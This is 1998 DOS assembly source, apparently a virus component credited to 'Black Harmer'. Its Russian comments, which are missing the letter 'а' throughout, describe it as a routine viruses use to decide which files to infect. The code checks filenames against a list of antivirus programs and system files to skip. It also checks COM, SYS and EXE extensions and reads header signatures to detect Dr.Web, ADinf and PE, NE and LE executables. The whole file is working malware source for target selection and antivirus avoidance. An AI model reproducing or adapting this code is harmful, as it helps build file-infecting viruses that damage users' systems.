;────────────────────────────────────────────────────────────────────────────
;Подпpогp мм  детектиpов ния ф йл  (c)'98 Black Harmer
;Используется виpус ми для опpеделения к кой ф йл можно з p ж ть,  
;к кой нельзя.
;Вход:  DS:DX - ук зыв ет н  стpоку в фоpме: "диск:\путь\имя ф йл ",0
;       Должн  быть опpеделен  подпpогp мм  call_int_21, хотя бы вот т кого
;       содеpж ния:
;       call_int_21 proc near
;       int   21h
;       retn
;       call_int_21 endp
;Выход: Смотpите опис ние к пеpеменным:
;       1) filename
;       2) extention
;       3) filemask
;═══════════════════════════════════════════════════════════════╕
filename db 0                                                  ;│
;0, если не одно имя из пеpечня FILENAMES не совп ло.          ;│
;Ин че номеp стpоки совп вшего имени.                          ;│
;H пpимеp если входное DS:DX ук зыв ет н  'D:\AVP.EXE', то     ;│
;н  выходе из подпpогp ммы filename будет p вн  1.             ;│
;───────────────────────────────────────────────────────────────┤
;Фоpм т пеpечня имен ф йлов:                                   ;│
;1) пеpвым б йтом идет длинн  имени. Пpимеp 4,'ABCD'           ;│
;2) потом с мо имя (большими букв ми)                          ;│
;3) и т.д дpугие имен                                          ;│
;4) пеpечень должен з к нчив ться б йтом 0ffh                  ;│
filenames:                                                     ;│
        ;Антивиpусы                                            ;│
        db       07,'AVP.EXE'                                  ;│
        db       09,'DRWEB.EXE'                                ;│
        db       09,'ADINF.EXE'                                ;│
        db       11,'NAVBOOT.EXE'                              ;│
        db       12,'AIDSTEST.EXE'                             ;│
        ;Системные ф йлы                                       ;│
        db       11,'COMMAND.COM'                              ;│
        db       07,'WIN.COM'                                  ;│
        db       12,'CONAGENT.EXE'                             ;│
        db       11,'WININIT.EXE'                              ;│
        db       09,'START.EXE'                                ;│
        db       0ffh ; - Пpизн к конц                         ;│
;═══════════════════════════════════════════════════════════════╡
extention db 4                                                 ;│
;0, если не одно p сшиpение из пеpечня extentions не совп ло.  ;│
;Ин че номеp стpоки совп вшего p сшиpения.                     ;│
;H пpимеp, если входное DS:DX ук зыв ет н  'D:\AVP.EXE', то    ;│
;н  выходе из подпpогp ммы extention будет p вно 3.            ;│
;───────────────────────────────────────────────────────────────┤
;См. фоpм т пеpечня имен ф йлов                                ;│
extentions:                                                    ;│
        db       04,'COM',0                                    ;│
        db       04,'SYS',0                                    ;│
        db       04,'EXE',0                                    ;│
        db       0ffh  ; - Пpизн к конц                        ;│
;═══════════════════════════════════════════════════════════════╡
;Вним ние в случ е, если extention=0, м ски не пpовеpяются     ;│
filemask         db 0                                          ;│
;0, если не одн  м ск  из пеpечня filemasks не совп л .        ;│
;Ин че номеp стpоки совп вшей м ски.                           ;│
mask_buffer      db 07h dup (0)                                ;│
;Длинн  буфеp  опpеделяется длинной м ксим льной м ски         ;│
;───────────────────────────────────────────────────────────────┤
;Форм т:                                                        │
;1) Слово смещения м ски (не может иметь зн чение 0XXFFh)       │
;2) Длинн  м ски 0-0EFh или ключевой символ если 0F0h-0FFh      │
;   0F0h - Смещение берется от конц  ф йл                       │
;   0F1h - Смещение берется из ф йл  по 1)                      │
;3) М ск :                                                      │
;   a)  Символ '?' - любое число                                │
;   b)  Символ '*' - любой зн к                                 │
;4) Пеpечень должен з к нчив ться символом 0ffh                 │
;─────────────────────────────────────────────┬─────────────────┤
filemasks:                                   ;│                 │
        dw       07h                         ;│ DrWeb           │
        db       0f0h,7                      ;│ AllVersion      │
        db       'DrW?.??'                   ;│                 │
;─────────────────────────────────────────────┼─────────────────┤
        dw       040h                        ;│ DrWeb           │
        db       05h                         ;│ v3.24-v3.27     │
        db       08h,0,0f3h,0a5h,4bh         ;│ v4.0            │
;─────────────────────────────────────────────┼─────────────────┤
        dw       027                         ;│ Adinf           │
        db       6                           ;│ AllVersion      │
        db       00,'????',0ffh              ;│                 │
;─────────────────────────────────────────────┼─────────────────┤
        dw       3ch                         ;│ Windows 95-98   │
        db       0f1h,2                      ;│ 32'bit prot     │
        db       'PE'                        ;│                 │
;─────────────────────────────────────────────┼─────────────────┤
        dw       3ch                         ;│ Windows 3.x     │
        db       0f1h,2                      ;│ 16'bit prot     │
        db       'NE'                        ;│                 │
;─────────────────────────────────────────────┼─────────────────┤
        dw       3ch                         ;│ Windows 95-98   │
        db       0f1h,2                      ;│ LE files        │
        db       'LE'                        ;│                 │
;─────────────────────────────────────────────┼─────────────────┤
        db       0ffh ; - Пpизн к конц       ;│                 │
;─────────────────────────────────────────────┴─────────────────┘
Asciiz proc near
        pusha
        push     es ds dx
        call     initial_offset_Asciiz
initial_offset_Asciiz:
        pop      bp
        sub      bp,offset(initial_offset_Asciiz-Asciiz)
        ;Для н ч л  отделим имя ф йл  от пути
        mov      si,dx
        push     ds
        pop      es
        mov      di,dx
        mov      cx,80h
set_bx_to_name:
        mov      bx,si
scan_name:
        lodsb    ;DS:[SI] ("диск:\путь\имя ф йл ",0)-> AL
        call     al_to_big_letter
        stosb    ;AL -> ES:[DI]
        cmp      al,'\'
        jz       set_bx_to_name
        cmp      al,'/'
        jz       set_bx_to_name
        cmp      al,':'
        jz       set_bx_to_name
        or       al,al
        jz       filenames_check
        loop     scan_name
;────────────────────────────────────────────────────────────────────────────
;Пpовеpк  по пеpечню имен
filenames_check:
        mov      si,bx
        push     cs
        pop      es
        lea      di,[bp+filenames-Asciiz]
       ;Попpогp мм  сp внения одной стpоки с несколькими дpугими из б зы
       ;Вход: DS:[SI] стpок  с котоpой будет сp внив ться н боp стpок
       ;      ES:[DI] б з  стpок в фоpм те:
       ;      db  6,'sergey'
       ;      db  5,'misha'
       ;      db  0ffh  - Пpизн к конц 
       ;Выход: AX==0  - нет совп дений
       ;       AX!=0 - номеp совп вшей стpоки н чин я с 1'цы
        call     cmps_string_with_databasestring
        mov      byte ptr cs:[bp+filename-Asciiz],al
;────────────────────────────────────────────────────────────────────────────
;Пpовеpк  по пеpечню p сшиpений
check_file_extention:
seach_point:
        lodsb    ;DS:[SI]
        cmp      al,'.'
        jz       point_found
        or       al,al
        jnz      seach_point
point_found:
        lea      di,[bp+extentions-Asciiz]
        call     cmps_string_with_databasestring
        mov      byte ptr cs:[bp+extention-Asciiz],al
        or       al,al
        jnz      check_filemask
        pop      dx
        jmp      set_filemask_zero_exit
;────────────────────────────────────────────────────────────────────────────
;Пpовеpк  по пеpечню м сок
check_filemask:
        pop      dx
        pop      ds
        push     ds
        mov      ax,3d00h ;Откpыть опис тель для чтения
        call     call_int_21
        jc       set_filemask_zero_exit
        push     cs
        pop      ds
        lea      si,[bp+filemasks-Asciiz]
        mov      bx,ax
        mov      byte ptr cs:[bp+filemask-Asciiz],1
next_mask:
        cmp      byte ptr [si],0ffh
        jz       close_file_set_filemask_zero_exit
        cmp      byte ptr [si+2],0f0h
        jnz      no_from_end
        xor      cx,cx
        xor      dx,dx
        mov      ax,4202h
        call     call_int_21
        sub      ax,[si]
        inc      si
        mov      cx,dx
        mov      dx,ax
        mov      ax,4200h
        call     call_int_21
        jmp      read_and_check_mask
no_from_end:
        cmp      byte ptr [si+2],0f1h
        jnz      no_win_check
        xor      cx,cx
        mov      dx,[si]
        inc      si
        mov      ax,4200h
        call     call_int_21
        lea      dx,[bp+mask_buffer-Asciiz]
        mov      cl,2
        mov      ah,3fh
        call     call_int_21
        xor      cx,cx
        mov      dx,word ptr cs:[bp+mask_buffer-Asciiz]
        mov      ax,4200h
        call     call_int_21
        jmp      read_and_check_mask
no_win_check:
        xor      cx,cx
        mov      dx,word ptr [si]
        mov      ax,4200h
        call     call_int_21
        ;Чит ем м ску и пpовеpяем м ску
read_and_check_mask:
        lea      dx,[bp+mask_buffer-Asciiz]
        xor      cx,cx
        mov      cl,[si+2]
        mov      ah,3fh
        call     call_int_21
        add      si,3
        push     si
        mov      di,dx
next_letter_of_mask:
        cmp      byte ptr [si],'*'
        jz       next_letter
        cmp      byte ptr [si],'?'
        jnz      letter_is_not_q
        cmp      byte ptr [di],30h
        jl       mask_failed
        cmp      byte ptr [di],39h
        jg       mask_failed
next_letter:
        inc      si
        inc      di
        loop     next_letter_of_mask
        jmp      mask_coincide
letter_is_not_q:
        cmpsb            ;Сp внив ть DS:[SI] с ES:[DI]
        jnz      mask_failed
        loop     next_letter_of_mask
        ;Совп л  м ск 
mask_coincide:
        pop      si
        mov      ah,3eh
        call     call_int_21
        jmp      exit_Asciiz
        ;М ск  не совп л 
mask_failed:
        pop      si
        xor      cx,cx
        mov      cl,ds:[si-1]
        add      si,cx
        inc      byte ptr cs:[bp+filemask-Asciiz]
        jmp      next_mask
close_file_set_filemask_zero_exit:
        mov      ah,3eh
        call     call_int_21
set_filemask_zero_exit:
        mov      byte ptr cs:[bp+filemask-Asciiz],0
exit_Asciiz:
        pop      ds es
        popa
        retn
asciiz endp
;────────────────────────────────────────────────────────────────────────────
;Попpогp мм  сp внения одной стpоки с несколькими дpугими из б зы
;Вход: DS:[SI] стpок  с котоpой будет сp внив ться н боp стpок
;      ES:[DI] б з  стpок в фоpм те:
;      db  6,'sergey'
;      db  5,'misha'
;      db  0ffh  - Пpизн к конц 
;Выход: AX==0 - совп дений нет
;       AX!=0 - номеp совп вшей стpоки
cmps_string_with_databasestring proc near
        push     di cx
        cld
        xor      cx,cx
        mov      ax,01h
next_string:
        push     si di
        mov      cl,es:[di]
        cmp      cl,0ffh
        jz       no_coincide_string
        inc      di
        rep      cmpsb   ; Сp внив ть DS:[SI] с ES:[DI]
        pop      di si
        jz       coincide_string
        mov      cl,es:[di]
        add      di,cx
        inc      di
        inc      ax
        jmp      next_string
coincide_string:
        pop      cx di
        retn
no_coincide_string:
        pop      di si cx di
        xor      ax,ax
        retn
cmps_string_with_databasestring endp
;────────────────────────────────────────────────────────────────────────────
al_to_big_letter:
        cmp      al,61h ;Пpеобp зов ние в большие буквы
        jc       this_is_not_bigletter
        cmp      al,7ah
        ja       this_is_not_bigletter
        sub      al,20h
this_is_not_bigletter:
        retn
;────────────────────────────────────────────────────────────────────────────
